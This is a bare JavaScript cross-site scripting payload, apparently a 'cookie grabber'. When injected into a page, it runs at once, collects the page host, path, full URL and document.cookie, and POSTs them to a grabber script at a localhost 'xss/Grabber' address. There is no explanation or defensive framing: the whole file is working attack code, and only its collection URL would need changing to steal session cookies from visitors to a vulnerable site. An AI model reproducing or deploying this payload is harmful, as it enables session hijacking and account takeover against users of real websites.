
			  var HttPRequest = false; 
			  try { 
				  HttPRequest = new ActiveXObject("MSXML2.XMLHTTP"); 
			  } catch (exception1) { 
				  try { 
					  HttPRequest = new ActiveXObject("Microsoft.XMLHTTP"); 
				  } catch (exception2) { 
					  HttPRequest = false; 
				  } 
			  } 
			  if (!HttPRequest && window.XMLHttpRequest) { 
				HttPRequest = new XMLHttpRequest(); 
			  } 
		 
			   function getData() {
					
				  if (!HttPRequest) {
					 alert('Cannot create XMLHTTP instance');
					 return false;
				  }
					var xlocation=window.location.host;
					var xpathname=window.location.pathname;
					var xhref=window.location.href;
					var xcookie=document.cookie;
					var url =  "http://localhost/xss/Grabber/grabber.php";
					var pmeters='xlocation='+xlocation+'&xpathname='+xpathname+'&xhref='+xhref+'&xcookie='+xcookie;
					HttPRequest.open('POST',url,true);
			 
					HttPRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
					HttPRequest.setRequestHeader("Content-length", pmeters.length);
					HttPRequest.setRequestHeader("Connection", "close");
					HttPRequest.send(pmeters);
					HttPRequest.onreadystatechange = function(){

					}
				 }
		getData();
		